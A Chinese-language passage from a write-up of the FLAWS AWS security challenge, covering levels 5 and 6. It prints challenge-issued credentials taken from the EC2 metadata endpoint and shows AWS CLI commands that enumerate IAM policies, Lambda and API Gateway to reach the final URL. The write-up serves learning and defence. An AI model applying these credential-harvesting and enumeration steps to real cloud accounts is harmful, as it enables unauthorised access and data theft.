    public-hostname
    public-ipv4
    public-keys/
    reservation-id
    security-groups
    services/
在里面找寻敏感信息，最终在 找到了泄露出的相关认证信息：
    {
      "Code" : "Success",
      "LastUpdated" : "2020-03-22T13:15:35Z",
      "Type" : "AWS-HMAC",
      "AccessKeyId" : "ASIA6GG7PSQGTDDQYCXX",
      "SecretAccessKey" : "GDgTEgIGzHntptP+d+OCUkh4kCt6OUpFAEwr3Pgp",
      "Token" : "IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQCRhJkGWHi5ic92C1P3CYkQ6y80qrDQOGnDoIz4PwqqbQIgNNna1gE6ze5ChRMPckatRWodHnnjjvyKPR2rhUKWiAEqvwMILhABGgw5NzU0MjYyNjIwMjkiDAFu8gkhNhgSdqABnyqcA1Uf5xMvRGDIGCeB40MAxq+HZNjhrI+EhdtFfpiAFGy6XrKKEekDvXAi9r8NnCd95nQJFdQfQWIXMtSlSjSQFf9o4o3xJ3XveYEVGqMn94t2Ch+LabJkssgeNg8vgJaT/bpagAHou4L2R73JDOg/YaLxCj1VglJlfYnzdY530P/8mW+zX+bhH2CXfGVtEW/lriFWsivYBqHtou8Om0Q34uCegkiHoGjNybToqGmEkMKZcwVzLdJ3cKQbvta2vIJ4dUo99eneSS2IHzojSZNS7ikxM31jJtrTfqIRVNreshgNLPRVxnBrd4V8ceHR7+8wyDRvFqxJ9cBePfUXhVt8xh95eeYLNSyNXJRASjwsNt6XB2au1ragGFRPJj1y2iZLZoUKeeTSqeVMmyN1w7LYjPx9rrui1er+C1t/Ytedd5WG94mJ8zEuQglY0RIcMfAChogIW6ZAq+E3DcJ/ADbuRrtMlqCnK4mq4RuwSrxND9VbA7oKWZVGPVkiFeGosgDtO6Ky/fk1uW7t3jvrzDvgok7mmLrtm3XqqySwlNAw7snd8wU65wFmeTnbDFKx3sVbLZC0/ZIOmUyuOrF3Yy/xyHjuxjKnv2xgt20jT8laVf4skWLExgSyTFxubuR0iYapG+J0dn/or9GiIMPAtXqOD6OGSzi3nDUYJkmO9dp8DTTv2hYWGKzkOLA+LpNYXM5oA50agJBJ1a461ax18xnAgwj1za44+mwW+qf6Ad272mvNgI+xKRgmXHt8OUPhDQdTqyMcQHjRaqmjLNau9Cx2Ks3ddZXlq0J/DSqOp7u7UAspnkO2OAogwvkhYGv0VDfH0W0q9WqvcoAUymJjRTWh6Ncsp+ubt+cUg0OSZuw=",
      "Expiration" : "2020-03-22T19:39:11Z"
    }
成功获取到一个`IAM`角色的认证信息。我们将这个认证信息添加到~/.aws/credentials中：
    [proxy]
    aws_access_key_id = ASIA6GG7PSQGTDDQYCXX
    aws_secret_access_key = GDgTEgIGzHntptP+d+OCUkh4kCt6OUpFAEwr3Pgp
    aws_session_token = IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQCRhJkGWHi5ic92C1P3CYkQ6y80qrDQOGnDoIz4PwqqbQIgNNna1gE6ze5ChRMPckatRWodHnnjjvyKPR2rhUKWiAEqvwMILhABGgw5NzU0MjYyNjIwMjkiDAFu8gkhNhgSdqABnyqcA1Uf5xMvRGDIGCeB40MAxq+HZNjhrI+EhdtFfpiAFGy6XrKKEekDvXAi9r8NnCd95nQJFdQfQWIXMtSlSjSQFf9o4o3xJ3XveYEVGqMn94t2Ch+LabJkssgeNg8vgJaT/bpagAHou4L2R73JDOg/YaLxCj1VglJlfYnzdY530P/8mW+zX+bhH2CXfGVtEW/lriFWsivYBqHtou8Om0Q34uCegkiHoGjNybToqGmEkMKZcwVzLdJ3cKQbvta2vIJ4dUo99eneSS2IHzojSZNS7ikxM31jJtrTfqIRVNreshgNLPRVxnBrd4V8ceHR7+8wyDRvFqxJ9cBePfUXhVt8xh95eeYLNSyNXJRASjwsNt6XB2au1ragGFRPJj1y2iZLZoUKeeTSqeVMmyN1w7LYjPx9rrui1er+C1t/Ytedd5WG94mJ8zEuQglY0RIcMfAChogIW6ZAq+E3DcJ/ADbuRrtMlqCnK4mq4RuwSrxND9VbA7oKWZVGPVkiFeGosgDtO6Ky/fk1uW7t3jvrzDvgok7mmLrtm3XqqySwlNAw7snd8wU65wFmeTnbDFKx3sVbLZC0/ZIOmUyuOrF3Yy/xyHjuxjKnv2xgt20jT8laVf4skWLExgSyTFxubuR0iYapG+J0dn/or9GiIMPAtXqOD6OGSzi3nDUYJkmO9dp8DTTv2hYWGKzkOLA+LpNYXM5oA50agJBJ1a461ax18xnAgwj1za44+mwW+qf6Ad272mvNgI+xKRgmXHt8OUPhDQdTqyMcQHjRaqmjLNau9Cx2Ks3ddZXlq0J/DSqOp7u7UAspnkO2OAogwvkhYGv0VDfH0W0q9WqvcoAUymJjRTWh6Ncsp+ubt+cUg0OSZuw=
尝试使用代理访问：
    ~$ aws --profile proxy s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud                                                 
                                       PRE ddcc78ff/                                                                           
            2017-02-27 10:11:07        871 index.html
成功获得权限进入，并找到隐藏目录`ddcc78ff/`，访问
，这就是level 6 的入口，成功通关level 5。
###  小结：
  * IP地址169.254.169.254是云服务中的一个神奇IP，AWS、Azure、谷歌、DigitalOcean等公司都使用它来查找自身的元数据。对于谷歌，对请求有额外的约束，比如要求它使用`Metadata-Flavor: Google`作为HTTP头，拒绝带有`x - forwarding - for`头的请求，而在AWS中并没有约束。如果攻击者可以从EC2向该IP发出任何类型的HTTP请求，就很有可能获取到一些敏感信息。这里提供hackerone平台上两篇公开披露的报告用以参考学习： 、 。
## 0x07 Level 6
> For this final challenge, you’re getting a user access key that has the
> SecurityAudit policy attached to it. See what else it can do and what else
> you might find in this AWS account.
>
> Access key ID: AKIAJFQ6E7BY57Q3OBGA  
>  Secret: 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
最后一关提供了一个附加了安全审计策略的用户的认证信息，看看我们能找到什么有趣的信息。
首先使用AWS CLI 配置这个用户：
    ~$ aws configure --profile flawslevel6
    AWS Access Key ID [None]: AKIAJFQ6E7BY57Q3OBGA
    AWS Secret Access Key [None]: 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
    Default region name [None]: us-west-2
    Default output format [None]:
在[AWS的文档](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_job-functions.html#jf_security-auditor)中，对`SecurityAudit`这样描述：
>
> [SecurityAudit](https://console.aws.amazon.com/iam/home#policies/arn:aws:iam::aws:policy/SecurityAudit)
>
> **Use case:** This user monitors accounts for compliance with security
> requirements. This user can access logs and events to investigate potential
> security breaches or potential malicious activity.
>
> **Policy description:** This policy grants permissions to view configuration
> data for many AWS services and to review their logs.
意思就是说：该用户可以访问日志和事件来调查潜在的安全漏洞或潜在的恶意活动，被授予查看一些AWS服务的配置数据和查看其日志的权限。
在level 3 中，我们查看到了S3存储桶中包含的内容：
尝试访问`flaws-logs`，结果没有权限：
    ~$ aws s3 ls s3://flaws-logs --profile flawslevel6
    An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
该政策可能涉及到的其他AWS服务包括`CloudTrail`和`CloudWatch`，继续尝试访问：
    ~$ aws cloudtrail describe-trails --profile flawslevel6
    {
        "trailList": [
            {
                "IncludeGlobalServiceEvents": true,
                "IsOrganizationTrail": true,
                "Name": "summitroute-logs",
                "TrailARN": "arn:aws:cloudtrail:us-east-1:763647780161:trail/summitroute-logs",
                "LogFileValidationEnabled": true,
                "IsMultiRegionTrail": true,
                "HasCustomEventSelectors": false,
                "S3BucketName": "summitroute-logs",
                "HasInsightSelectors": false,
                "HomeRegion": "us-east-1"
            }
        ]
    }
`CloudTrail`服务是开启的，那么尝试查看`CloudTrail`的事件，结果没有权限：
    ~$ aws cloudtrail lookup-events --profile flawslevel6
    An error occurred (AccessDeniedException) when calling the LookupEvents operation: User: arn:aws:iam::975426262029:user/Level6 is not authorized to perform: cloudtrail:LookupEvents
转换思路，查看此用户的相关信息：
    ~$ aws --profile flawslevel6 iam get-user
    {
        "User": {
            "UserName": "Level6",
            "Path": "/",
            "CreateDate": "2017-02-26T23:11:16Z",
            "UserId": "AIDAIRMDOSCWGLCDWOG6A",
            "Arn": "arn:aws:iam::975426262029:user/Level6"
        }
    }
得到`UserName`为`Level6`，继续查看这个用户的附加策略：
    ~$ aws --profile flawslevel6 iam list-attached-user-policies --user-name Level6
    {
        "AttachedPolicies": [
            {
                "PolicyName": "list_apigateways",
                "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
            },
            {
                "PolicyName": "MySecurityAudit",
                "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
            }
        ]
    }
发现附加了`list_apigateways`的策略，更详细的查看这个策略：
    ~$ aws --profile flawslevel6 iam get-policy  --policy-arn arn:aws:iam::975426262029:policy/list_apigat eways
    {
        "Policy": {
            "PolicyName": "list_apigateways",
            "Description": "List apigateways",
            "PermissionsBoundaryUsageCount": 0,
            "CreateDate": "2017-02-20T01:45:17Z",
            "AttachmentCount": 1,
            "IsAttachable": true,
            "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
            "DefaultVersionId": "v4",
            "Path": "/",
            "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
            "UpdateDate": "2017-02-20T01:48:17Z"
        }
    }
我们得到了这个策略的`Arn`和`DefaultVersionId`，能够进一步详细查看：
    ~$ aws --profile flawslevel6 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list _apigateways --version-id v4
    {
        "PolicyVersion": {
            "CreateDate": "2017-02-20T01:48:17Z",
            "VersionId": "v4",
            "Document": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Action": [
                            "apigateway:GET"
                        ],
                        "Resource": "arn:aws:apigateway:us-west-2::/restapis/*",
                        "Effect": "Allow"
                    }
                ]
            },
            "IsDefaultVersion": true
        }
    }
发现了这个用户允许使用`GET`方法访问资源`arn:aws:apigateway:us-west-2::/restapis/*`。`apigateway`通常与`Lambda`函数放在一起使用：
    ~$ aws --region us-west-2 --profile flawslevel6 lambda list-functions
    {
        "Functions": [
            {
                "TracingConfig": {
                    "Mode": "PassThrough"
                },
                "Version": "$LATEST",
                "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
                "FunctionName": "Level6",
                "MemorySize": 128,
                "RevisionId": "22f08307-9080-4403-bf4d-481ddc8dcb89",
                "CodeSize": 282,
                "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
                "Handler": "lambda_function.lambda_handler",
                "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
                "Timeout": 3,
                "LastModified": "2017-02-27T00:24:36.054+0000",
                "Runtime": "python2.7",
                "Description": "A starter AWS Lambda function."
            }
        ]
    }
存在一个`FunctionName`叫做Level6，继续详细查看这个策略：
    aws --region us-west-2 --profile flawslevel6 lambda get-policy --function-name Level6
    {
        "Policy": "{"Version":"2012-10-17","Id":"default","Statement":[{"Sid":"904610a93f593b76ad66ed6ed82c0a8b","Effect":"Allow","Principal":{"Service":"apigateway.amazonaws.com"},"Action":"lambda:InvokeFunction","Resource":"arn:aws:lambda:us-west-2:975426262029:function:Level6","Condition":{"ArnLike":{"AWS:SourceArn":"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6"}}}]}",
        "RevisionId": "22f08307-9080-4403-bf4d-481ddc8dcb89"
    }
发现`arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6`这样一串有趣的资源信息，其中`s33ppypa75`为`rest-api-id`，利用这个信息，进一步查看，得到`"stageName": "Prod"`：
    ~$ aws --profile flawslevel6 --region us-west-2 apigateway get-stages --rest-api-id "s33ppypa75"
    {
        "item": [
            {
                "tracingEnabled": false,
                "stageName": "Prod",
                "cacheClusterEnabled": false,
                "cacheClusterStatus": "NOT_AVAILABLE",
                "deploymentId": "8gppiv",
                "lastUpdatedDate": 1488155168,
                "createdDate": 1488155168,
                "methodSettings": {}
            }
        ]
    }
根据AWS的资源端点规则：`https://.execute-api..amazonaws.com//`，可以得到最终的资源点位于： 。在浏览器中访问地址，返回一串文字：
    "Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/
访问给出的网址，成功通关level 6，至此多有挑战全部通关完成：
## 总结
通过FLAWS的挑战，对涉及到AWS的有关漏洞进行了实践学习，从安全运维人员的角度，可以避免踩坑，配置合理的内容和权限，从漏洞发现挖掘的角度，可以在漏洞发现过程中，尝试可能存在的隐患点、漏洞点，说不定有意外之喜。
作为一个小白，这篇FLAWS通关记，是为了记录和分享自己的学习过程，分析记录的不到位的地方，还请大佬们收下留情 =）